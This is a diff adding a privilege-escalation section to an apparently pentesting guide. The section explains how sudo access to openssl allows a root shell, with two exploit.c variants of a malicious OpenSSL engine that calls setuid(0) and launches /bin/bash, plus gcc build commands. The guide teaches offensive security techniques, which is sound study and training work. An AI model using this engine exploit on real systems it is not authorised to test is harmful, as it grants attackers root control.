@@ -457,3 +457,97 @@ sudo chmod +s /usr/bin/missing_so
 ```
 {% endtab %}
 {% endtabs %}
+
+### #5. sudo openssl
+
+If openssl can be run as root with sudo, we can check in GTFOBins whether it is possible to escalate privileges or not:
+
+![](../../../.gitbook/assets/openssl\_sudo\_library\_load.png)
+
+While there are many ways to escalate privileges with openssl, let's look at the library loading part. In this case we are not given any **.so** (Shared Object) file, so we have to build it. In the command the `-engine` parameter is used, and doing a quick Google search as "**openssl engine so**", we see an [article](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/) that shows us a **.c** file to load the "engine":
+
+![](../../../.gitbook/assets/openssl\_engine\_c.png)
+
+Here we simply add our malicious payload and compile it:
+
+{% hint style="info" %}
+Don't forget to execute the command with `sudo`.
+{% endhint %}
+
+{% tabs %}
+{% tab title="#1" %}
+{% code title="exploit.c" %}
+```c
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0); setgid(0);
+  system("/bin/bash");
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="#2" %}
+{% code title="exploit.c" %}
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <openssl/engine.h>
+
+static const char *engine_id = "root shell";
+static const char *engine_name = "Spawns a root shell";
+
+static int bind(ENGINE *e, const char *id)
+{
+    int ret = 0;
+
+    if (!ENGINE_set_id(e, engine_id)) {
+        fprintf(stderr, "ENGINE_set_id failed\n");
+        goto end;
+    }
+    
+    if (!ENGINE_set_name(e, engine_name)) {
+        printf("ENGINE_set_name failed\n");
+        goto end;
+    }
+
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    
+    ret = 1;
+    
+    end:
+    return ret;
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+```bash
+# Dependencies (for engine.h):
+apt-get install libssl-dev # Ubuntu/Debian
+yum install openssl-devel # Fedora/CentOS/RHEL
+# Compilation #1 (recommended):
+gcc -shared -o exploit.so -fPIC exploit.c
+# Compilation #2:
+gcc -fPIC -o exploit.o -c exploit.c
+gcc -shared -o exploit.so -lcryto exploit.o
+```
+
+**Note**: In "**Compilation #2**", if we have problems with the `-lcryto` parameter, we add the directory where **libcrypto.so** is located with the `-l` parameter:
+
+```bash
+gcc -shared -o exploit.so -L/usr/local/lib64 -lcrypto exploit.o
+gcc -shared -o exploit.so -L/usr/lib -lcrypto exploit.o
+```
